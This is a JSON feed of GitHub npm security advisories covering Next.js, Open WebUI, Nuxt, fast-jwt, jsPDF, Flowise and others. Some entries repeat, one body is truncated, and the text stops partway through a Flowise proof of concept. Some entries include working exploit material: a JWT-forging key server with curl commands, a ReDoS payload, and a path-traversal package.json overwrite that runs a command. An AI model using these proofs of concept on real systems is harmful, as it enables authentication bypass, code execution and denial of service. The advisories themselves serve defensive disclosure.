{
    "version": "https://jsonfeed.org/version/1",
    "title": "Security Advisory for JavaScript packages hosted at npmjs.com",
    "home_page_url": "https://github.com/advisories?query=type%3Areviewed+ecosystem%3Anpm",
    "feed_url": "https://azu.github.io/github-advisory-database-rss/npm.json",
    "description": "Security Advisory for JavaScript packages hosted at npmjs.com on GitHub",
    "items": [
        {
            "content_html": "<h1 id=\"impact\">Impact</h1>\n<p>It is possible to bypass authorization checks within a Next.js application, if the authorization check occurs in middleware.</p>\n<h1 id=\"patches\">Patches</h1>\n<ul>\n<li>For Next.js 15.x, this issue is fixed in <code>15.2.3</code></li>\n<li>For Next.js 14.x, this issue is fixed in <code>14.2.25</code></li>\n<li>For Next.js versions <code>11.1.4</code> thru <code>13.5.6</code>, consult the below workaround.</li>\n</ul>\n<h1 id=\"workaround\">Workaround</h1>\n<p>If patching to a safe version is infeasible, it is recommend that you prevent external user requests which contain the <code>x-middleware-subrequest</code> header from reaching your Next.js application.</p>\n<h2 id=\"credits\">Credits</h2>\n<ul>\n<li>Allam Rachid (zhero;)</li>\n<li>Allam Yasser (inzo_)</li>\n</ul>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/vercel/next.js/security/advisories/GHSA-f82v-jwr5-mffw\">https://github.com/vercel/next.js/security/advisories/GHSA-f82v-jwr5-mffw</a></li>\n<li><a href=\"https://github.com/vercel/next.js/commit/52a078da3884efe6501613c7834a3d02a91676d2\">https://github.com/vercel/next.js/commit/52a078da3884efe6501613c7834a3d02a91676d2</a></li>\n<li><a href=\"https://github.com/vercel/next.js/commit/5fd3ae8f8542677c6294f32d18022731eab6fe48\">https://github.com/vercel/next.js/commit/5fd3ae8f8542677c6294f32d18022731eab6fe48</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2025-29927\">https://nvd.nist.gov/vuln/detail/CVE-2025-29927</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-f82v-jwr5-mffw\">https://github.com/advisories/GHSA-f82v-jwr5-mffw</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-f82v-jwr5-mffw",
            "title": "[next] Authorization Bypass in Next.js Middleware",
            "date_modified": "2025-03-21T15:42:38.000Z",
            "date_published": "2025-03-21T15:20:12.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-f82v-jwr5-mffw"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h1 id=\"impact\">Impact</h1>\n<p>It is possible to bypass authorization checks within a Next.js application, if the authorization check occurs in middleware.</p>\n<h1 id=\"patches\">Patches</h1>\n<ul>\n<li>For Next.js 15.x, this issue is fixed in <code>15.2.3</code></li>\n<li>For Next.js 14.x, this issue is fixed in <code>14.2.25</code></li>\n<li>For Next.js versions <code>11.1.4</code> thru <code>13.5.6</code>, consult the below workaround.</li>\n</ul>\n<h1 id=\"workaround\">Workaround</h1>\n<p>If patching to a safe version is infeasible, it is recommend that you prevent external user requests which contain the <code>x-middleware-subrequest</code> header from reaching your Next.js application.</p>\n<h2 id=\"credits\">Credits</h2>\n<ul>\n<li>Allam Rachid (zhero;)</li>\n<li>Allam Yasser (inzo_)</li>\n</ul>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/vercel/next.js/security/advisories/GHSA-f82v-jwr5-mffw\">https://github.com/vercel/next.js/security/advisories/GHSA-f82v-jwr5-mffw</a></li>\n<li><a href=\"https://github.com/vercel/next.js/commit/52a078da3884efe6501613c7834a3d02a91676d2\">https://github.com/vercel/next.js/commit/52a078da3884efe6501613c7834a3d02a91676d2</a></li>\n<li><a href=\"https://github.com/vercel/next.js/commit/5fd3ae8f8542677c6294f32d18022731eab6fe48\">https://github.com/vercel/next.js/commit/5fd3ae8f8542677c6294f32d18022731eab6fe48</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2025-29927\">https://nvd.nist.gov/vuln/detail/CVE-2025-29927</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-f82v-jwr5-mffw\">https://github.com/advisories/GHSA-f82v-jwr5-mffw</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-f82v-jwr5-mffw",
            "title": "[next] Authorization Bypass in Next.js Middleware",
            "date_modified": "2025-03-21T15:42:38.000Z",
            "date_published": "2025-03-21T15:20:12.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-f82v-jwr5-mffw"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h1 id=\"impact\">Impact</h1>\n<p>It is possible to bypass authorization checks within a Next.js application, if the authorization check occurs in middleware.</p>\n<h1 id=\"patches\">Patches</h1>\n<ul>\n<li>For Next.js 15.x, this issue is fixed in <code>15.2.3</code></li>\n<li>For Next.js 14.x, this issue is fixed in <code>14.2.25</code></li>\n<li>For Next.js versions <code>11.1.4</code> thru <code>13.5.6</code>, consult the below workaround.</li>\n</ul>\n<h1 id=\"workaround\">Workaround</h1>\n<p>If patching to a safe version is infeasible, it is recommend that you prevent external user requests which contain the <code>x-middleware-subrequest</code> header from reaching your Next.js application.</p>\n<h2 id=\"credits\">Credits</h2>\n<ul>\n<li>Allam Rachid (zhero;)</li>\n<li>Allam Yasser (inzo_)</li>\n</ul>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/vercel/next.js/security/advisories/GHSA-f82v-jwr5-mffw\">https://github.com/vercel/next.js/security/advisories/GHSA-f82v-jwr5-mffw</a></li>\n<li><a href=\"https://github.com/vercel/next.js/commit/52a078da3884efe6501613c7834a3d02a91676d2\">https://github.com/vercel/next.js/commit/52a078da3884efe6501613c7834a3d02a91676d2</a></li>\n<li><a href=\"https://github.com/vercel/next.js/commit/5fd3ae8f8542677c6294f32d18022731eab6fe48\">https://github.com/vercel/next.js/commit/5fd3ae8f8542677c6294f32d18022731eab6fe48</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2025-29927\">https://nvd.nist.gov/vuln/detail/CVE-2025-29927</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-f82v-jwr5-mffw\">https://github.com/advisories/GHSA-f82v-jwr5-mffw</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-f82v-jwr5-mffw",
            "title": "[next] Authorization Bypass in Next.js Middleware",
            "date_modified": "2025-03-21T15:42:38.000Z",
            "date_published": "2025-03-21T15:20:12.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-f82v-jwr5-mffw"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>A Denial of Service (DoS) vulnerability exists in open-webui/open-webui version 0.3.21. This vulnerability affects multiple endpoints, including <code>/ollama/models/upload</code>, <code>/audio/api/v1/transcriptions</code>, and <code>/rag/api/v1/doc</code>. The application processes multipart boundaries without authentication, leading to resource exhaustion. By appending additional characters to the multipart boundary, an attacker can cause the server to parse each byte of the boundary, ultimately leading to service unavailability. This vulnerability can be exploited remotely, resulting in high CPU and memory usage, and rendering the service inaccessible to legitimate users.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2024-9840\">https://nvd.nist.gov/vuln/detail/CVE-2024-9840</a></li>\n<li><a href=\"https://huntr.com/bounties/9178f09e-4d4f-4a5b-bc32-cada7445b03c\">https://huntr.com/bounties/9178f09e-4d4f-4a5b-bc32-cada7445b03c</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-5ccf-884p-4jjq\">https://github.com/advisories/GHSA-5ccf-884p-4jjq</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-5ccf-884p-4jjq",
            "title": "[open-webui] Open WebUI Unauthenticated Multipart Boundary Denial of Service (DoS) Vulnerability",
            "date_modified": "2025-03-21T03:38:58.000Z",
            "date_published": "2025-03-20T12:32:51.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-5ccf-884p-4jjq"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"summary\">Summary</h3>\n<p>By sending a crafted HTTP request to a server behind an CDN, it is possible in some circumstances to poison the CDN cache and highly impacts the availability of a site.</p>\n<p>It is possible to craft a request, such as <code>https://mysite.com/?/_payload.json</code> which will be rendered as JSON. If the CDN in front of a Nuxt site ignores the query string when determining whether to cache a route, then this JSON response could be served to future visitors to the site.</p>\n<h3 id=\"impact\">Impact</h3>\n<p>An attacker can perform this attack to a vulnerable site in order to make a site unavailable indefinitely. It is also possible in the case where the cache will be reset to make a small script to send a request each X seconds (=caching duration) so that the cache is permanently poisoned making the site completely unavailable.</p>\n<h2 id=\"conclusion-\">Conclusion :</h2>\n<p>This is similar to a vulnerability in Next.js that resulted in CVE-2024-46982 (and see <a href=\"https://zhero-web-sec.github.io/research-and-things/nextjs-cache-and-chains-the-stale-elixir\">this article</a>, in particular the \"Internal URL parameter and pageProps\" part, the latter being very similar to the one concerning us here.)</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/nuxt/nuxt/security/advisories/GHSA-jvhm-gjrh-3h93\">https://github.com/nuxt/nuxt/security/advisories/GHSA-jvhm-gjrh-3h93</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2025-27415\">https://nvd.nist.gov/vuln/detail/CVE-2025-27415</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-jvhm-gjrh-3h93\">https://github.com/advisories/GHSA-jvhm-gjrh-3h93</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-jvhm-gjrh-3h93",
            "title": "[nuxt] Nuxt allows DOS via cache poisoning with payload rendering response",
            "date_modified": "2025-03-20T19:31:05.000Z",
            "date_published": "2025-03-19T19:54:25.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-jvhm-gjrh-3h93"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"summary\">Summary</h3>\n<p>The <code>fast-jwt</code> library does not properly validate the <code>iss</code> claim based on the RFC <a href=\"https://datatracker.ietf.org/doc/html/rfc7519#page-9\">https://datatracker.ietf.org/doc/html/rfc7519#page-9</a>.</p>\n<h4 id=\"details\">Details</h4>\n<p>The <code>iss</code> (issuer) claim validation within the fast-jwt library permits an array of strings as a valid <code>iss</code> value. This design flaw enables a potential attack where a malicious actor crafts a JWT with an <code>iss</code> claim structured as <code>['https://attacker-domain/', 'https://valid-iss']</code>. Due to the permissive validation, the JWT will be deemed valid.</p>\n<p>Furthermore, if the application relies on external libraries like <code>get-jwks</code> that do not independently validate the <code>iss</code> claim, the attacker can leverage this vulnerability to forge a JWT that will be accepted by the victim application. Essentially, the attacker can insert their own domain into the <code>iss</code> array, alongside the legitimate issuer, and bypass the intended security checks.</p>\n<h4 id=\"poc\">PoC</h4>\n<p>Take a server running the following code:</p>\n<pre><code class=\"language-js\">const express = require('express')\nconst buildJwks = require('get-jwks')\nconst { createVerifier } = require('fast-jwt')\n\nconst jwks = buildJwks({ providerDiscovery: true });\nconst keyFetcher = async (jwt) =&gt;\n    jwks.getPublicKey({\n        kid: jwt.header.kid,\n        alg: jwt.header.alg,\n        domain: jwt.payload.iss\n    });\n\n\nconst jwtVerifier = createVerifier({\n    key: keyFetcher,\n    allowedIss: 'https://valid-iss',\n});\n\nconst app = express();\nconst port = 3000;\n\napp.use(express.json());\n\n\nasync function verifyToken(req, res, next) {\n  const headerAuth = req.headers.authorization.split(' ')\n  let token = '';\n  if (headerAuth.length &gt; 1) {\n    token = headerAuth[1];\n  }\n\n  const payload = await jwtVerifier(token);\n\n  req.decoded = payload;\n  next();\n}\n\n// Endpoint to check if you are auth or not\napp.get('/auth', verifyToken, (req, res) =&gt; {\n  res.json(req.decoded);\n});\n\napp.listen(port, () =&gt; {\n  console.log(`Server is running on port ${port}`);\n});\n</code></pre>\n<p>Now we build a server that will be used to generate the JWT token and send the verification keys to the victim server:</p>\n<pre><code class=\"language-js\">const { generateKeyPairSync } = require('crypto');\nconst express = require('express');\nconst pem2jwk = require('pem2jwk');\nconst jwt = require('jsonwebtoken');\n\nconst app = express();\nconst port = 3001;\nconst host = `http://localhost:${port}/`;\n\nconst { publicKey, privateKey } = generateKeyPairSync(\"rsa\", \n    {   modulusLength: 4096,\n        publicKeyEncoding: { type: 'pkcs1', format: 'pem' },\n        privateKeyEncoding: { type: 'pkcs1', format: 'pem' },\n    },\n); \nconst jwk = pem2jwk(publicKey);\n\napp.use(express.json());\n\n// Endpoint to create token\napp.post('/create-token', (req, res) =&gt; {\n  const token = jwt.sign({ ...req.body, iss: [host, 'https://valid-iss'],  }, privateKey, { algorithm: 'RS256' });\n  res.send(token);\n});\n\napp.get('/.well-known/jwks.json', (req, res) =&gt; {\n    return res.json({\n        keys: [{\n            ...jwk,\n            alg: 'RS256',\n            use: 'sig',\n        }]\n    });\n})\n\napp.all('*', (req, res) =&gt; {\n    return res.json({\n        \"issuer\": host,\n        \"jwks_uri\": host + '.well-known/jwks.json'\n    });\n});\n\napp.listen(port, () =&gt; {\n  console.log(`Server is running on port ${port}`);\n});\n</code></pre>\n<pre><code class=\"language-bash\">export TOKEN=$(curl -X POST http://localhost:3001/create-token -H \"Content-Type: application/json\" -d '{\"name\": \"test\"}')\ncurl -X GET http://localhost:3000/auth -H \"Authorization: Bearer $TOKEN\"\n</code></pre>\n<h4 id=\"impact\">Impact</h4>\n<p>Applications relaying on the validation of the <code>iss</code> claim by fast-jwt allows attackers to sign arbitrary payloads which will be accepted by the verifier.</p>\n<h4 id=\"solution\">Solution</h4>\n<p>Change <a href=\"https://github.com/nearform/fast-jwt/blob/d2b0ccb103848917848390f96f06acee339a7a19/src/verifier.js#L475\">https://github.com/nearform/fast-jwt/blob/d2b0ccb103848917848390f96f06acee339a7a19/src/verifier.js#L475</a> to a validator tha accepts only string for the value as stated in the RFC <a href=\"https://datatracker.ietf.org/doc/html/rfc7519#page-9\">https://datatracker.ietf.org/doc/html/rfc7519#page-9</a>.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/nearform/fast-jwt/security/advisories/GHSA-gm45-q3v2-6cf8\">https://github.com/nearform/fast-jwt/security/advisories/GHSA-gm45-q3v2-6cf8</a></li>\n<li><a href=\"https://github.com/nearform/fast-jwt/commit/cc26b1d473f900446ad846f8f0b10eb1c0adcbdd\">https://github.com/nearform/fast-jwt/commit/cc26b1d473f900446ad846f8f0b10eb1c0adcbdd</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2025-30144\">https://nvd.nist.gov/vuln/detail/CVE-2025-30144</a></li>\n<li><a href=\"https://datatracker.ietf.org/doc/html/rfc7519#page-9\">https://datatracker.ietf.org/doc/html/rfc7519#page-9</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-gm45-q3v2-6cf8\">https://github.com/advisories/GHSA-gm45-q3v2-6cf8</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-gm45-q3v2-6cf8",
            "title": "[fast-jwt] Fast-JWT Improperly Validates iss Claims",
            "date_modified": "2025-03-20T18:58:43.000Z",
            "date_published": "2025-03-19T15:48:43.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-gm45-q3v2-6cf8"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"impact\">Impact</h3>\n<p>User control of the first argument of the <code>addImage</code> method results in CPU utilization and denial of service.</p>\n<p>If given the possibility to pass unsanitized image urls to the <code>addImage</code> method, a user can provide a harmful data-url that results in high CPU utilization and denial of service.</p>\n<p>Other affected methods are: <code>html</code>, <code>addSvgAsImage</code>.</p>\n<p>Example payload:</p>\n<pre><code class=\"language-js\">import { jsPDF } from \"jpsdf\" \n\nconst doc = new jsPDF();\nconst payload = 'data:/charset=scharset=scharset=scharset=scharset=scharset=scharset=scharset=scharset=scharset=scharset=scharset=scharset=scharset=scharset=scharset=scharset=scharset=scharset=scharset=scharset=scharset=scharset=scharset=scharset=scharset=scharset=scharset=s\\x00base64,undefined';\n\nconst startTime = performance.now()\n\ntry {\n doc.addImage(payload, \"PNG\", 10, 40, 180, 180, undefined, \"SLOW\");\n} catch (err) {\n  const endTime = performance.now()\n  console.log(`Call to doc.addImage took ${endTime - startTime} milliseconds`)\n}\n\ndoc.save(\"a4.pdf\");\n</code></pre>\n<h3 id=\"patches\">Patches</h3>\n<p>The vulnerability was fixed in jsPDF 3.0.1. Upgrade to jspdf@&gt;=3.0.1</p>\n<h3 id=\"workarounds\">Workarounds</h3>\n<p>Sanitize image urls before passing it to the <code>addImage</code> method or one of the other affected methods.</p>\n<h3 id=\"credits\">Credits</h3>\n<p>Researcher: Aleksey Solovev (Positive Technologies)</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/parallax/jsPDF/security/advisories/GHSA-w532-jxjh-hjhj\">https://github.com/parallax/jsPDF/security/advisories/GHSA-w532-jxjh-hjhj</a></li>\n<li><a href=\"https://github.com/parallax/jsPDF/commit/b167c43c27c466eb914b927885b06073708338df\">https://github.com/parallax/jsPDF/commit/b167c43c27c466eb914b927885b06073708338df</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2025-29907\">https://nvd.nist.gov/vuln/detail/CVE-2025-29907</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-w532-jxjh-hjhj\">https://github.com/advisories/GHSA-w532-jxjh-hjhj</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-w532-jxjh-hjhj",
            "title": "[jspdf] jsPDF Bypass Regular Expression Denial of Service (ReDoS)",
            "date_modified": "2025-03-19T05:58:36.000Z",
            "date_published": "2025-03-18T21:07:47.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-w532-jxjh-hjhj"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>Uptime Kuma &gt;== 1.23.0 has a ReDoS vulnerability, specifically when an administrator creates a notification through the web service. If a string is provided it triggers catastrophic backtracking in the regular expression, leading to a ReDoS attack.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2025-26042\">https://nvd.nist.gov/vuln/detail/CVE-2025-26042</a></li>\n<li><a href=\"https://github.com/louislam/uptime-kuma/issues/5574\">https://github.com/louislam/uptime-kuma/issues/5574</a></li>\n<li><a href=\"https://github.com/louislam/uptime-kuma/pull/5573\">https://github.com/louislam/uptime-kuma/pull/5573</a></li>\n<li><a href=\"https://github.com/louislam/uptime-kuma/commit/7a9191761dbef6551c2a0aa6eed5f693ba48d688\">https://github.com/louislam/uptime-kuma/commit/7a9191761dbef6551c2a0aa6eed5f693ba48d688</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-3rw8-4xrq-3f7p\">https://github.com/advisories/GHSA-3rw8-4xrq-3f7p</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-3rw8-4xrq-3f7p",
            "title": "[uptime-kuma] Uptime Kuma ReDoS vulnerability",
            "date_modified": "2025-03-20T19:28:30.000Z",
            "date_published": "2025-03-17T21:30:34.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-3rw8-4xrq-3f7p"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>Mattermost Desktop App versions &lt;=5.10.0 explicitly declared unnecessary macOS entitlements which allows an attacker with remote access to bypass Transparency, Consent, and Control (TCC) via code injection.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2025-1398\">https://nvd.nist.gov/vuln/detail/CVE-2025-1398</a></li>\n<li><a href=\"https://mattermost.com/security-updates\">https://mattermost.com/security-updates</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-xmvv-w44w-j8wx\">https://github.com/advisories/GHSA-xmvv-w44w-j8wx</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-xmvv-w44w-j8wx",
            "title": "[mattermost-desktop] Mattermost Desktop App allows the bypass of Transparency, Consent, and Control (TCC) via code injection",
            "date_modified": "2025-03-17T21:27:35.000Z",
            "date_published": "2025-03-17T15:31:50.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-xmvv-w44w-j8wx"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>An issue in canvg prior to v.4.0.3 and v3.0.11 can lead to prototype pollution via the Constructor of the class StyleElement.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2025-25977\">https://nvd.nist.gov/vuln/detail/CVE-2025-25977</a></li>\n<li><a href=\"https://github.com/canvg/canvg/issues/1749\">https://github.com/canvg/canvg/issues/1749</a></li>\n<li><a href=\"https://github.com/canvg/canvg/blob/937668eced93e0335c67a255d0d2277ea708b2cb/src/Document/StyleElement.ts\">https://github.com/canvg/canvg/blob/937668eced93e0335c67a255d0d2277ea708b2cb/src/Document/StyleElement.ts</a></li>\n<li><a href=\"https://github.com/canvg/canvg/commit/c3743e6345f3e01aefdcdd412c3f26494f4b5d7d\">https://github.com/canvg/canvg/commit/c3743e6345f3e01aefdcdd412c3f26494f4b5d7d</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-v2mw-5mch-w8c5\">https://github.com/advisories/GHSA-v2mw-5mch-w8c5</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-v2mw-5mch-w8c5",
            "title": "[canvg] canvg Prototype Pollution vulnerability",
            "date_modified": "2025-03-17T15:41:45.000Z",
            "date_published": "2025-03-10T18:31:56.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-v2mw-5mch-w8c5"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>An issue in canvg prior to v.4.0.3 and v3.0.11 can lead to prototype pollution via the Constructor of the class StyleElement.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2025-25977\">https://nvd.nist.gov/vuln/detail/CVE-2025-25977</a></li>\n<li><a href=\"https://github.com/canvg/canvg/issues/1749\">https://github.com/canvg/canvg/issues/1749</a></li>\n<li><a href=\"https://github.com/canvg/canvg/blob/937668eced93e0335c67a255d0d2277ea708b2cb/src/Document/StyleElement.ts\">https://github.com/canvg/canvg/blob/937668eced93e0335c67a255d0d2277ea708b2cb/src/Document/StyleElement.ts</a></li>\n<li><a href=\"https://github.com/canvg/canvg/commit/c3743e6345f3e01aefdcdd412c3f26494f4b5d7d\">https://github.com/canvg/canvg/commit/c3743e6345f3e01aefdcdd412c3f26494f4b5d7d</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-v2mw-5mch-w8c5\">https://github.com/advisories/GHSA-v2mw-5mch-w8c5</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-v2mw-5mch-w8c5",
            "title": "[canvg] canvg Prototype Pollution vulnerability",
            "date_modified": "2025-03-17T15:41:45.000Z",
            "date_published": "2025-03-10T18:31:56.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-v2mw-5mch-w8c5"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>An issue in parse-git-config v.3.0.0 allows an attacker to obtain sensitive information via the expandKeys function.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2025-25975\">https://nvd.nist.gov/vuln/detail/CVE-2025-25975</a></li>\n<li><a href=\"https://github.com/jonschlinkert/parse-git-config/issues/14\">https://github.com/jonschlinkert/parse-git-config/issues/14</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-8g77-54rh-46hx\">https://github.com/advisories/GHSA-8g77-54rh-46hx</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-8g77-54rh-46hx",
            "title": "[parse-git-config] Prototype Pollution Vulnerability in parse-git-config",
            "date_modified": "2025-03-20T19:27:24.000Z",
            "date_published": "2025-03-12T21:31:29.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-8g77-54rh-46hx"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"impact\">Impact</h3>\n<p>XSS vulnerability when the sanitizer is used with a <code>contentEditable</code> element to set the elements <code>innerHTML</code> to a sanitized string produced by the package. If the code is particularly crafted to abuse the code beautifier, that runs AFTER sanitation.</p>\n<h3 id=\"patches\">Patches</h3>\n<p>Patched in version 2.0.3</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/jitbit/HtmlSanitizer/security/advisories/GHSA-vhv4-fh94-jm5x\">https://github.com/jitbit/HtmlSanitizer/security/advisories/GHSA-vhv4-fh94-jm5x</a></li>\n<li><a href=\"https://github.com/jitbit/HtmlSanitizer/commit/af6d2a78877e7277cd01c825b7fb50edb5956963\">https://github.com/jitbit/HtmlSanitizer/commit/af6d2a78877e7277cd01c825b7fb50edb5956963</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2025-29771\">https://nvd.nist.gov/vuln/detail/CVE-2025-29771</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-vhv4-fh94-jm5x\">https://github.com/advisories/GHSA-vhv4-fh94-jm5x</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-vhv4-fh94-jm5x",
            "title": "[@jitbit/htmlsanitizer] JS Html Sanitizer allows XSS when used with contentEditable",
            "date_modified": "2025-03-14T21:41:27.000Z",
            "date_published": "2025-03-14T19:54:52.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-vhv4-fh94-jm5x"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>Inconsistent </p>",
            "url": "https://github.com/advisories/GHSA-549p-5c7f-c5p4",
            "title": "[froala-editor] Froala WYSIWYG editor allows cross-site scripting (XSS)",
            "date_modified": "2025-03-14T18:51:50.000Z",
            "date_published": "2024-11-08T00:30:45.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-549p-5c7f-c5p4"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"summary\">Summary</h3>\n<p>An attacker could write files with arbitrary content to the filesystem via the <code>/api/v1/document-store/loader/process</code> API.\nAn attacker can reach RCE(Remote Code Execution) via file writing.</p>\n<h3 id=\"details\">Details</h3>\n<p>All file writing functions in <a href=\"https://github.com/FlowiseAI/Flowise/blob/main/packages/components/src/storageUtils.ts\">packages/components/src/storageUtils.ts</a> are vulnerable.</p>\n<ul>\n<li>addBase64FilesToStorage</li>\n<li>addArrayFilesToStorage</li>\n<li>addSingleFileToStorage</li>\n</ul>\n<p>The fileName parameter, which is an untrusted external input, is being used as an argument to path.join() without verification.</p>\n<pre><code class=\"language-javascript\">const filePath = path.join(dir, fileName)\nfs.writeFileSync(filePath, bf)\n</code></pre>\n<p>Therefore, users can move to the parent folder via <code>../</code> and write files to any path.</p>\n<p>Once file writing is possible in all paths, an attacker can reach RCE (Remote Code Execution) in a variety of ways.</p>\n<p>In PoC (Proof of Concept), RCE was reached by overwriting package.json.</p>\n<h3 id=\"poc\">PoC</h3>\n<p>In PoC, <code>package.json</code> is overwritten.\nThis is a scenario in which arbitrary code is executed when <code>pnpm start</code> is executed by changing the start command in the <code>scripts{}</code> statement to an arbitrary value.</p>\n<p><strong>- original start command</strong></p>\n<pre><code>\"start\": \"run-script-os\",\n</code></pre>\n<p><strong>- modify start command</strong></p>\n<pre><code>\"start\": \"touch /tmp/pyozzi-poc &amp;&amp; run-script-os\",\n</code></pre>\n<p>When a user runs the <code>pnpm start</code> command, a <code>pyozzi-poc</code> file is created in the <code>/tmp</code> path.</p>\n<h4 id=\"1-packagejson-content-base64-encoding\">1. package.json content base64 encoding</h4>\n<pre><code class=\"language-json\">{\n    \"name\": \"flowise\",\n    \"version\": \"1.8.2\",\n    \"private\": true,\n    \"homepage\": \"https://flowiseai.com\",\n    \"workspaces\": [\n        \"packages/*\",\n        \"flowise\",\n        \"ui\",\n        \"components\"\n    ],\n    \"scripts\": {\n        \"build\": \"turbo run build &amp;&amp; echo poc\",\n        \"build-force\": \"pnpm clean &amp;&amp; turbo run build --force\",\n        \"dev\": \"turbo run dev --parallel\",\n        \"start\": \"touch /tmp/pyozzi-poc &amp;&amp; run-script-os\", --&gt; modify (add touch /tmp/pyozzi &amp;&amp;)\n        \"start:windows\": \"cd packages/server/bin &amp;&amp; run start\",\n        \"start:default\": \"cd packages/server/bin &amp;&amp; ./run start\",\n        \"clean\": \"pnpm --filter \\\"./packages/**\\\" clean\",\n        \"nuke\": \"pnpm --filter \\\"./packages/**\\\" nuke &amp;&amp; rimraf node_modules .turbo\",\n        \"format\": \"prettier --write \\\"**/*.{ts,tsx,md}\\\"\",\n        \"lint\": \"eslint \\\"**/*.{js,jsx,ts,tsx,json,md}\\\"\",\n        \"lint-fix\": \"pnpm lint --fix\",\n        \"quick\": \"pretty-quick --staged\",\n        \"postinstall\": \"husky install\",\n        \"migration:create\": \"pnpm typeorm migration:create\"\n    }, ... skip\n</code></pre>\n<h4 id=\"2-overwrite-packagejson-via-apiv1document-storeloaderprocess\">2. Overwrite <code>package.json</code> via <code>/api/v1/document-store/loader/process</code></h4>\n<img src=\"https://github.com/FlowiseAI/Flowise/assets/86613161/a548732d-4bee-4cd0-8565-54fb8e560500\" alt=\"image\" width=\"1329\">\n\n<blockquote>\n<p><strong>Request Body</strong></p>\n</blockquote>\n<pre><code class=\"language-json\">{\n    \"loaderId\": \"textFile\",\n    \"storeId\": 